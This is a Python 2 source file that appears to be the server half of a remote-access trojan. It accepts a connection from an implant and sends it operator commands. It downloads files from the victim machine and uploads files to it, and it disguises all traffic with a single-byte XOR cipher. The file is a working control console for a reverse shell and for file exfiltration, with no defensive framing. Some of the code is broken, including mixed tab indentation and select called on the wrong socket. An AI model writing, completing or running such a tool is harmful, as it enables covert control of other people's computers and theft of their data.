import socket, select

HOST = 'localhost'
PORT = 35001

def xor(message):
    newMessage = ""
    for char in message:
	deChar = ord(char) ^ ord('[')
        newMessage += str(unichr(deChar))
    return newMessage

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(1)


while True:
    conn, addr = sock.accept()
    print ('Connected by '+str(addr))
 #   rec = conn.recv(15);
  #  print (xor(rec));

    while True:
        data = raw_input("enter command: ")
        if not data:
            ## Use this to clear the network buffers
            conn.sendall(xor("clearbuffer"))

            ## Receive anything still in the client's buffer,
            ## but timeout after 1 second.
            ## Use multiple times to avoid lag issues.
            ready = select.select([sock], [], [], 1)
            if ready[0]:
                rec = conn.recv(1024)
                print(xor(rec))
            continue
        elif data == "kill":
            conn.sendall(xor("kill"))
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break
        elif data == "end":
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            exit()            
        elif "upload" in data.lower():
            # syntax: upload /path/to/file/to/upload
            # file will go to client's  current working directory
            data = xor(data)
            conn.sendall(data)
            rec = conn.recv(1024)
            print(xor(rec))
        elif "download" in data.lower():
            # syntax: download /remote/path/to/file/to/download /local/path
            # file will go to server's current working directory
            
            command = data.split(' ')

            if len(command) != 3:
                print("Incorrect download syntax")
                continue
                
            destinationPath = command.pop(1)
            f = open(destinationPath, 'wb')
            print("Writing file to {}\n".format(destinationPath))
            data = ' '.join(command)
            data = xor(data)
            conn.sendall(data)
        
            fileData = conn.recv(1024)
            while(fileData):

                fileData = xor(fileData)
                print(fileData)
                ## This will probably break at some point, not ideal solution
                if "99999EOF99999" in fileData:
                    temp = fileData.split("99999EOF99999")
                    if "xxxxx" in temp[0]:
                        temp = temp[0].split("xxxxx")
                        fileSize = temp[1]
                        print("Writing {} bytes.\n".format(fileSize))
                        f.write(temp[2])
                    else:
                        f.write(temp[0])
                    break
                elif "xxxxx" in fileData:
                    temp = fileData.split("xxxxx")
                    fileSize = temp[1]
                    print("Writing {} bytes.\n".format(fileSize))
                    f.write(temp[2])
                    fileData = conn.recv(1024)
                else:
                    f.write(fileData)
                    fileData = conn.recv(1024)    

            print("File download complete!\n")
            f.close()
            break
        else:
            data = xor(data)
            conn.sendall(data)
            rec = conn.recv(1024)
            print(xor(rec))

